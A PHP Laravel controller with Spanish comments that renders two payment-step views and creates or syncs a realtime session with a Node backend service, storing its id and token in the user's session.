<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Arr;
use GuzzleHttp\Promise\PromiseInterface;

class PaymentController extends Controller
{
    public function index(Request $request)
    {
        $view = "layouts.step1";
        abort_if(!View::exists($view), 404);
        return view($view);
    }

    // ✅ Render step2 asegurando RT igual que bank
    public function step2(Request $request)
    {
        // maxSteps no aplica acá; pero usamos 2 solo para consistencia mental
        $this->ensureRealtimeSessionGeneral($request);

        $sc = (array) $request->session()->get('sc', []);

        $view = "layouts.step2";
        abort_if(!View::exists($view), 404);

        return view($view, [
            'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),
            'sessionId' => Arr::get($sc, 'rt_session_id'),
            'sessionToken' => Arr::get($sc, 'rt_session_token'),
        ]);
    }

    // ✅ Endpoint JSON opcional (si lo sigues usando con fetch)
    public function initAuth(Request $request)
    {
        $this->ensureRealtimeSessionGeneral($request);

        $sc = (array) $request->session()->get('sc', []);

        return response()->json([
            'ok' => true,
            'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),
            'sessionId' => Arr::get($sc, 'rt_session_id'),
            'sessionToken' => Arr::get($sc, 'rt_session_token'),
        ]);
    }

    // ======= PRIVATE =======
    private function ensureRealtimeSessionGeneral(Request $request): void
    {
        $sc = (array) $request->session()->get('sc', []);
        $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');

        // En flujo general no hay bank, pero sí queremos action base:
        $sc['bank'] = $sc['bank'] ?? '';         // general
        $sc['action'] = $sc['action'] ?? 'DATA';  // tu nuevo flujo

        // 1) Ya existe sessionId => NO crear otra
        if (!empty($sc['rt_session_id'])) {

            // 1.1 token si falta
            if (empty($sc['rt_session_token'])) {
                try {
                    $url = $baseUrl . '/api/sessions/';
                    $resp = Http::asJson()->timeout(10)->post($url);

                    if ($resp instanceof PromiseInterface) $resp = $resp->wait();

                    if ($resp->successful()) {
                        $sc['rt_session_token'] = $resp->json('sessionToken');
                        $request->session()->put('sc', $sc);
                        $request->session()->save();
                    }
                } catch (\Throwable $e) {
                    $resp = Http::asJson()->timeout(10)->post($url);
                }
            }

            // 1.2 opcional: sync action (si quieres)
            // (si tu API requiere token para GET, usa withToken; si no, déjalo simple)
            if (!empty($sc['rt_session_token'])) {
                try {
                    $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'];
                    $resp = Http::withToken($sc['rt_session_token'])->timeout(10)->get($url);

                    if ($resp instanceof PromiseInterface) $resp = $resp->wait();

                    if ($resp->successful()) {
                        $nodeAction = $resp->json('session.action') ?? $resp->json('action');
                        if ($nodeAction) {
                            $sc['action'] = $nodeAction;
                            $request->session()->put('sc', $sc);
                            $request->session()->save();
                        }
                    }
                } catch (\Throwable $e) {}
            }

            return;
        }

        // 2) No hay sessionId => crear sesión realtime en Node
        try {
            $url = $baseUrl . '/api/sessions';
            $resp = Http::asJson()->timeout(10)->post($url, $sc);

            if ($resp instanceof PromiseInterface) $resp = $resp->wait();

            if ($resp->successful()) {
                $sc['rt_session_id'] = $resp->json('sessionId');
                $sc['rt_session_token'] = $resp->json('sessionToken');

                $nodeAction = $resp->json('session.action') ?? $resp->json('action');
                if ($nodeAction) $sc['action'] = $nodeAction;

                $request->session()->put('sc', $sc);
                $request->session()->save();
            }
        } catch (\Throwable $e) {}
    }
}